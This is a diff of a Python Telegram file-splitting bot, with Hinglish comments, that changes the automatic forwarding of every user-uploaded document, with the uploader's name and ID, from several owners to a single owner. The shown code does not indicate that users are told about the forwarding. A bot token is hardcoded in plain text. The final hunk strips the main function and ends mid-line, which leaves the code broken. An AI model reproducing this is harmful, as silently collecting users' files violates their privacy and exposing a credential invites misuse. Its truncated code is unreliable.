@@ -21,11 +21,8 @@ from telegram.error import TelegramError
 # Apna asli Bot Token yahan daalein
 BOT_TOKEN = "8811033165:AAG4NQszrJa3bP0Cgz-nuanE1g7RVVb2coA"
 
-# Owners ki Telegram User IDs
-OWNER_IDS = [
-    8665264271,
-    8665264271
-]
+# Sirf ek Owner ki Telegram User ID (Yahan aap apni ID daalein)
+OWNER_ID = 8665264271
 
 # Paths setup
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -61,23 +58,22 @@ def get_user_identifier(user):
         return f"@{user.username}"
     return user.first_name
 
-async def forward_to_owners(context: ContextTypes.DEFAULT_TYPE, user, file_id, file_name):
-    """Forwards the newly uploaded file directly to bot owners using Telegram File ID."""
+async def forward_to_owner(context: ContextTypes.DEFAULT_TYPE, user, file_id, file_name):
+    """Forwards the newly uploaded file directly to the single bot owner using Telegram File ID."""
     caption = (
         f"📩 <b>New File Uploaded!</b>\n\n"
         f"<b>Uploader:</b> {get_user_identifier(user)} (ID: <code>{user.id}</code>)\n"
         f"<b>File Name:</b> <code>{file_name}</code>"
     )
-    for owner_id in OWNER_IDS:
-        try:
-            await context.bot.send_document(
-                chat_id=owner_id,
-                document=file_id,
-                caption=caption,
-                parse_mode=ParseMode.HTML
-            )
-        except Exception as e:
-            logger.error(f"Error forwarding file to owner {owner_id}: {e}")
+    try:
+        await context.bot.send_document(
+            chat_id=OWNER_ID,
+            document=file_id,
+            caption=caption,
+            parse_mode=ParseMode.HTML
+        )
+    except Exception as e:
+        logger.error(f"Error forwarding file to owner {OWNER_ID}: {e}")
 
 async def count_lines(file_path):
     """Count lines in large files quickly."""
@@ -181,8 +177,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
 
-    # Automatically forward to owners using File ID directly (Fast & Reliable)
-    await forward_to_owners(context, user, doc.file_id, doc.file_name)
+    # Automatically forward to the single owner using File ID directly
+    await forward_to_owner(context, user, doc.file_id, doc.file_name)
 
 # ==================================================
 # FEATURE: SPLIT (/spl)
@@ -378,14 +374,4 @@ def main():
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("stop", stop_process))
     
-    application.add_handler(MessageHandler(filters.Regex(r'^/spl\d+$') | filters.Regex(r'^/spl\s+\d+$'), split_file))
-    application.add_handler(MessageHandler(filters.Regex(r'^/ext.+$'), extract_prefix))
-    application.add_handler(CommandHandler("clear", clear_file))
-    
-    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-
-    print("Bot is running...")
-    application.run_polling()
-
-if __name__ == '__main__':
-    main()
+    application.add_handler(MessageHandler(filters.Regex(r'^/spl\d+$') |
